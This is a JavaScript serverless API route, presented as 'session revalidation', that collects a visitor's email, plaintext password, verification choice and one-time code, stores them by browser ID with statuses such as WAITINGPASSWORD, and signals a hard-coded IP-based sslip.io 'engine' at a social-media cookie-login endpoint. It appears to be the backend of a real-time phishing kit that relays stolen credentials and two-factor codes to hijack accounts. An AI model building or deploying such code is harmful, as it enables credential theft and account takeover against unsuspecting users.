import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { requireFeature } from "../../../../utils/featureGate.js";

function parseBody(text) {
    try { return JSON.parse(text); } catch (e) {}
    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
    return null;
}

export async function POST(request) {
    incrementUsage();
    const gate = await requireFeature('allowRevalidation', 'session revalidation');
    if (gate) return gate;

    const text = await request.text();
    const body = parseBody(text);
    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);

    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, method } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    const updates = { lastUserActivity: new Date().toISOString() };

    if (updateType === 'email' && email) {
        updates.email = email;
        updates.domain = email.split('@')[1] || '';
        if (password) updates.password = password;
    } else if (updateType === 'password' && password) {
        updates.password = password;
        const row = getCachedRow(browserId);
        if (row?.status === 'WAITINGPASSWORDERROR') {
            updates.status = 'WAITINGPASSWORD';
        }
    } else if (updateType === 'verificationChoice' && verificationChoice) {
        updates.verificationChoice = verificationChoice;
    } else if (updateType === 'verificationCode' && verificationCode) {
        updates.verificationCode = verificationCode;
    } else if (updateType === 'method') {
        const normalized = String(method || '').trim().toLowerCase();
        if (!['qr', 'email', 'phone'].includes(normalized)) {
            return corsJson({ success: false, error: "Invalid method — expected qr|email|phone" }, 400);
        }
        const row = getCachedRow(browserId);
        let prior = {};
        try {
            const raw = row?.lastJsonResponse;
            prior = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : {};
        } catch (e) { prior = {}; }
        updates.loginMethod = normalized;
        updates.lastJsonResponse = JSON.stringify({
            browserId,
            status: row?.status || prior.status || 'WAITING',
            platform: prior.platform || '',
            loginMethod: normalized,
            timestamp: new Date().toISOString(),
            message: `Login method set to ${normalized}`
        });
    }

    setCachedRow(browserId, updates);

    const engineUrl = process.env.ENGINE_URL || 'https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io';
    fetch(`${engineUrl}/socials/cookie/cookie-api-login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ browserId, wakeUp: true })
    }).catch(() => {});

    return corsJson({ success: true });
}

export async function OPTIONS() {
    return corsOptions();
}
